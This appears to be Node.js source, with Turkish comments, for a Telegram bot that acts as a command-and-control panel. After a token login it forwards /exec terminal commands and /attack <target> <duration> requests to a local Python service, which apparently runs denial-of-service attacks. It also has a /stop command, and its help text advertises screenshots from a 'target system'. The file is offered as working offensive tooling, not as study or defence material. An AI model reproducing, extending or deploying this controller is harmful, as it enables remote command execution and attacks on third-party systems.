const TelegramBot = require('node-telegram-bot-api');
const mysql = require('mysql');
const axios = require('axios');

const token = 'APİ GİR';
const bot = new TelegramBot(token, { polling: true });

const API_ENDPOINT = 'http://127.0.0.1:5000'; // Python servisine bağlanmak için API URL

// MySQL Veritabanı Bağlantısı
const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: '',
  database: 'panel_db'
});

db.connect(err => {
  if (err) {
    console.error('❌ Veritabanı bağlantısı başarısız!', err);
    return;
  }
  console.log('✅ Veritabanı bağlantısı başarılı.');
});

const authenticatedUsers = new Map();

// Kullanıcı doğrulama
bot.onText(/\/login (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userToken = match[1];

  const query = `SELECT login_token FROM users WHERE login_token = ? LIMIT 1`;
  db.query(query, [userToken], (err, result) => {
    if (err || result.length === 0) {
      bot.sendMessage(chatId, '⚠️ Yetkisiz erişim! Geçerli bir token girin.');
      return;
    }
    authenticatedUsers.set(chatId, userToken);
    bot.sendMessage(chatId, '✅ Giriş başarılı! Artık komutları kullanabilirsiniz.');
  });
});

// Komut listesi
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  const helpMessage = `📜 *Komut Listesi:*
  
  /login <token> - Kullanıcı doğrulama
  /start - Botu başlat
  /help - Komut listesini gösterir
  /exec <komut> - Terminalde komut çalıştırır
  /screenshot - Hedef sistemden ekran görüntüsü alır
  /attack <ip/url> <süre> - Belirtilen hedefe saldırı başlatır
  /stop - Aktif saldırıyı durdurur
  /ping <ip/url> - Belirtilen hedefe ping atar`;

  bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
});

// Terminal komutu çalıştırma
bot.onText(/\/exec (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1];

  if (!authenticatedUsers.has(chatId)) {
    bot.sendMessage(chatId, '⚠️ Lütfen önce giriş yapın: /login <token>');
    return;
  }

  try {
    const response = await axios.post(`${API_ENDPOINT}/exec`, { command });
    bot.sendMessage(chatId, `✅ Çıktı: \n${response.data.output}`);
  } catch (error) {
    bot.sendMessage(chatId, `❌ Komut çalıştırılırken hata oluştu: ${error.message}`);
  }
});

// Saldırı başlatma
bot.onText(/\/attack (.+) (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const duration = match[2];

  if (!authenticatedUsers.has(chatId)) {
    bot.sendMessage(chatId, '⚠️ Lütfen önce giriş yapın: /login <token>');
    return;
  }

  try {
    await axios.post(`${API_ENDPOINT}/attack`, { target, duration });
    bot.sendMessage(chatId, `🚀 Saldırı başlatıldı: ${target} süresi: ${duration} saniye`);
  } catch (error) {
    bot.sendMessage(chatId, `❌ Saldırı başlatılamadı: ${error.message}`);
  }
});

// Saldırıyı durdurma
bot.onText(/\/stop/, async (msg) => {
  const chatId = msg.chat.id;

  if (!authenticatedUsers.has(chatId)) {
    bot.sendMessage(chatId, '⚠️ Lütfen önce giriş yapın: /login <token>');
    return;
  }

  try {
    await axios.post(`${API_ENDPOINT}/stop`);
    bot.sendMessage(chatId, `🛑 Saldırı durduruldu.`);
  } catch (error) {
    bot.sendMessage(chatId, `❌ Saldırı durdurulamadı: ${error.message}`);
  }
});

// Ping atma
bot.onText(/\/ping (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];

  if (!authenticatedUsers.has(chatId)) {
    bot.sendMessage(chatId, '⚠️ Lütfen önce giriş yapın: /login <token>');
    return;
  }

  try {
    const response = await axios.post(`${API_ENDPOINT}/ping`, { target });
    bot.sendMessage(chatId, `📡 Ping sonucu: \n${response.data.output}`);
  } catch (error) {
    bot.sendMessage(chatId, `❌ Ping atılırken hata oluştu: ${error.message}`);
  }
});

console.log('🚀 Telegram bot çalışıyor... Komutları bekliyor!');